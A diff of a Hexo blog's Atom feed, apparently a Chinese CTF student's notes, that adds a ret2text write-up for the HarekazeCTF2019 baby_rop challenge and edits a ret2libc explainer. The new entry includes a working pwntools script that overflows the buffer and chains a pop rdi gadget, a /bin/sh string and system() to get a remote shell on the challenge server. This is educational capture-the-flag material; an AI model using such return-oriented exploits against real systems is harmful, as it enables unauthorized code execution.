@@ -6,7 +6,7 @@
   <link href="https://pr0b1em.github.io/atom.xml" rel="self"/>
   
   <link href="https://pr0b1em.github.io/"/>
-  <updated>2021-06-20T09:19:32.491Z</updated>
+  <updated>2021-06-20T12:47:26.703Z</updated>
   <id>https://pr0b1em.github.io/</id>
   
   <author>
@@ -17,13 +17,32 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>ret2text</title>
+    <link href="https://pr0b1em.github.io/2021/06/20/ret2text/"/>
+    <id>https://pr0b1em.github.io/2021/06/20/ret2text/</id>
+    <published>2021-06-20T09:28:46.000Z</published>
+    <updated>2021-06-20T12:47:26.703Z</updated>
+    
+    <content type="html"><![CDATA[<span id="more"></span><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h3 id="与ret2libc最大的不同是在于计算地址的偏移量"><a href="#与ret2libc最大的不同是在于计算地址的偏移量" class="headerlink" title="与ret2libc最大的不同是在于计算地址的偏移量"></a>与ret2libc最大的不同是在于计算地址的偏移量</h3><p>其它步骤都与正常的解法相差无异，最主要就是用gdb查找计算偏移量的问题，这个地方偏移量计算对了，后面才能正确得到flag</p><h2 id="例题：-HarekazeCTF2019-baby-rop-ret2text"><a href="#例题：-HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="例题： [HarekazeCTF2019]baby_rop(ret2text)"></a>例题： [HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p><p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p><p>IDA打开，F5查看main函数</p><p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p><p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p><p>看见system函数</p><p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p><p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p><p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p><p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p><p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure><p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p><p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p><p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>]]></content>
+    
+    
+    <summary type="html">ret2text类型题目解法</summary>
+    
+    
+    
+    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>ret2libc</title>
     <link href="https://pr0b1em.github.io/2021/06/20/ret2libc/"/>
     <id>https://pr0b1em.github.io/2021/06/20/ret2libc/</id>
     <published>2021-06-20T07:26:12.000Z</published>
-    <updated>2021-06-20T09:19:32.491Z</updated>
+    <updated>2021-06-20T12:48:57.670Z</updated>
     
-    <content type="html"><![CDATA[<span id="more"></span><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSI C的函数库。</p><p>ret2libc即控制函数执行libc中的函数。通常选择执行system(“/bin/sh”)</p><h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p><p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p><h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p><p>1.泄露 一个调用函数的 地址</p><p>2.获取 libc 版本</p><p>3.获取 system 地址与 /bin/sh 的地址</p><p>4.再次执行源程序</p><p>5.触发栈溢出执行 system(‘/bin/sh’)</p><p>shellcode结构：</p><p><img src="/img/shellcode.png"></p><p>正常堆栈布局：</p><p><img src="/img/1.png"></p><p>ret2libc执行system的堆栈布局：</p><p><img src="/img/2.png"></p><p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>]]></content>
+    <content type="html"><![CDATA[<span id="more"></span><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSIC的函数库。</p><p>ret2libc即控制函数执行libc中的函数,通常选择执行system(“/bin/sh”)。</p><h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p><p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p><h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p><p>1.泄露 一个调用函数的 地址</p><p>2.获取 libc 版本</p><p>3.获取 system 地址与 /bin/sh 的地址</p><p>4.再次执行源程序</p><p>5.触发栈溢出执行 system(‘/bin/sh’)</p><p>shellcode结构：</p><p><img src="/img/shellcode.png"></p><p>正常堆栈布局：</p><p><img src="/img/1.png"></p><p>ret2libc执行system的堆栈布局：</p><p><img src="/img/2.png"></p><p>具体例题可以查看[OGeek2019]babyrop的writeup。</p><p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>]]></content>
     
     
     <summary type="html">ret2libc类型题目解法</summary>
